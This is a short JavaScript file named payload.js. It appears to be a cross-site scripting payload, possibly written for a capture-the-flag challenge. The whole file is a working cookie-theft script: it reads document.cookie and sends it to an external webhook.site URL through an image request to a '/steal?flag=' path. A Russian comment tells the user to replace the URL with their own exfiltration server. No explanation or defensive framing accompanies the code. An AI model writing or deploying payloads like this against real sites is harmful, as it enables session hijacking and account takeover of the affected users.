// payload.js
(function(){
    try {
        var img = new Image();
        // заменяй на свой сервер для exfil
        img.src = 'https://webhook.site/6ec5e230-6597-4847-8ab2-5baefc1a45f7/steal?flag=' + encodeURIComponent(document.cookie);
    } catch(e){
        console.error(e);
    }
})();
